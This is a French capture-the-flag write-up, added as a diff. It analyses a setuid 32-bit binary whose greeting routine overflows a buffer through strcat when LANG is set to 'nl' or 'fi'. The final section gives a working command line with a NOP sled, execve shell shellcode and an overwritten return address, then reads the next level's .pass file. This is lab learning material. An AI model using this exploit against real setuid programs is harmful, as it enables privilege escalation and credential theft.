@@ -1,0 +1,56 @@
+# Bonus 2
+## Résumé
+Buffer overflow avec env `LANG` => écrase `eip` de `greetuser` => shellcode en environnement
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
+$> file bonus2 
+bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
+```
+Le home contient un binaire appartenant à l'user `bonus3` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/bonus3/.pass`.
+
+On récupère le fichier `bonus2` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 bonus2@10.11.200.192:/home/user/bonus2/bonus2 .
+$> r2 bonus2
+```
+
+
+## Analyse
+### Analyse du programme
+
+Dans la fonction `main`, on peut voir qu'il faut 2 arguments au programme, pour ne pas sortir.  
+Ensuite ces 2 arguments sont copiés dans un buffer1, 40 caracteres max pour `argv[1]` et 32 caracteres max pour `argv[2]` 
+Il y a apres un appel a `getenv("LANG")`, si cette variable d'environnement n'existe pas alors la variable `language = 0`.
+De meme pour `LANG="fi"`, `language = 1` et pour `LANG="nl"`, language=2.
+
+Ensuite appel de la fonction `greetuser()` avec le buffer1 contenant les 2 arguments.
+Dans cette fonction, on peut voir que selon le language, une phrase differente sera copiée dans un buffer2 de taille 0x48 (=72).
+
+Language:
+=0 : "Hello "
+=1 : "Hyvää päivää "
+=2 : "Goedemiddag! "
+
+Ensuite on rajoute buffer2 a la suite de buffer1, avec la fonction `strcat`;
+Et affichage du buffer1;
+
+
+### Mise en place de l'exploitation
+
+Pour l'exploitation de ce programme, nous allons changer le resultat de la variable d'environnement `LANG`, pour quelle soit egale a `nl` ou `fi`. Car la taille des phrases est de 13 caracteres.
+Et nous savons que le buffer2 utilisé dans le strcat a une taille max de 72 caracteres, apres quoi on commence a ecraser EBP, puis EIP.
+
+Donc 13 + 40 + 32 = 85
+C'est donc suffisant pour reecrire sur l'EIP, et le faire pointer sur un shellcode.
+Shellcode que nous pouvons mettre par exemple dans argv[1], ou dans une variable d'environnement.
+
+
+## Application
+```sh
+$> LANG=nl ./bonus2  $(python -c 'print "A"*40 + "\x90"*35 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') $(python -c 'print "A"*23 + "\xbc\xf8\xff\xbf"')
+$ cd ../bonus3/
+$ cat .pass 
+```
